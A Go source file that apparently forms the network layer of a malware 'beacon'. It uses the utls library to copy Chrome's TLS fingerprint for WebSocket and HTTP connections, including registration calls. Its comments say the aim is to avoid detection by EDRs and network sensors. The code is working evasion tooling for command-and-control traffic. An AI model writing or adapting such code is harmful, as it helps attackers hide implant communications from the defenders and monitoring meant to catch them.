package main

import (
	"context"
	"crypto/tls"
	"net"
	"net/http"
	"time"

	"github.com/gorilla/websocket"
	utls "github.com/refraction-networking/utls"
)

// newStealthDialer returns a websocket.Dialer that impersonates a real browser's
// TLS fingerprint (JA3/JA4) using utls. Without this, Go's crypto/tls produces
// a unique handshake signature that EDRs and network sensors flag instantly.
func newStealthDialer(timeout time.Duration) *websocket.Dialer {
	return &websocket.Dialer{
		HandshakeTimeout: timeout,
		// Override the default net.Dial to inject our utls connection
		NetDialTLSContext: stealthDialTLS,
	}
}

// stealthDialTLS dials TCP first, then wraps it in a utls connection that
// mimics Chrome's ClientHello instead of Go's default.
func stealthDialTLS(ctx context.Context, network, addr string) (net.Conn, error) {
	// 1. Plain TCP dial
	dialer := &net.Dialer{Timeout: 15 * time.Second}

	// We need a real context.Context for DialContext, but gorilla passes
	// an interface with just Deadline(). Build a background ctx with the deadline.
	tcpConn, err := dialer.Dial(network, addr)
	if err != nil {
		return nil, err
	}

	// Extract hostname for SNI
	host, _, _ := net.SplitHostPort(addr)

	// 2. Wrap in utls — impersonate Chrome's TLS fingerprint
	tlsConfig := &utls.Config{
		ServerName:         host,
		InsecureSkipVerify: false, // keep cert verification on
	}

	// HelloChrome_Auto picks the right Chrome version based on current fingerprints
	uconn := utls.UClient(tcpConn, tlsConfig, utls.HelloChrome_Auto)

	// Materialize the ClientHello so we can patch extensions before handshake.
	// Force ALPN to http/1.1: Go's http.Transport with a custom DialTLSContext
	// cannot speak HTTP/2, and Cloudflare defaults to h2 when it sees it in ALPN.
	// The server then replies with an HTTP/2 SETTINGS frame that the HTTP/1.x
	// parser rejects as "malformed HTTP response" — killing the preflight.
	if err := uconn.BuildHandshakeState(); err == nil {
		for _, ext := range uconn.Extensions {
			if alpnExt, ok := ext.(*utls.ALPNExtension); ok {
				alpnExt.AlpnProtocols = []string{"http/1.1"}
				break
			}
		}
	}

	// 3. Perform the handshake with the spoofed ClientHello
	if deadline, ok := ctx.Deadline(); ok {
		uconn.SetDeadline(deadline)
	}
	if err := uconn.Handshake(); err != nil {
		tcpConn.Close()
		return nil, err
	}
	// Clear the deadline after handshake so WS reads/writes aren't affected
	uconn.SetDeadline(time.Time{})

	return uconn, nil
}

// stealthHTTPClient returns an http.Client that uses the same utls transport.
// Useful for any non-WS HTTP calls the beacon makes (registration, etc.)
func stealthHTTPClient() *http.Client {
	return &http.Client{
		Timeout: 35 * time.Second,
		Transport: &http.Transport{
			DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				return stealthDialTLS(ctx, network, addr)
			},
			TLSClientConfig: &tls.Config{
				// Fallback — utls handles the actual handshake above
				MinVersion: tls.VersionTLS12,
			},
		},
	}
}
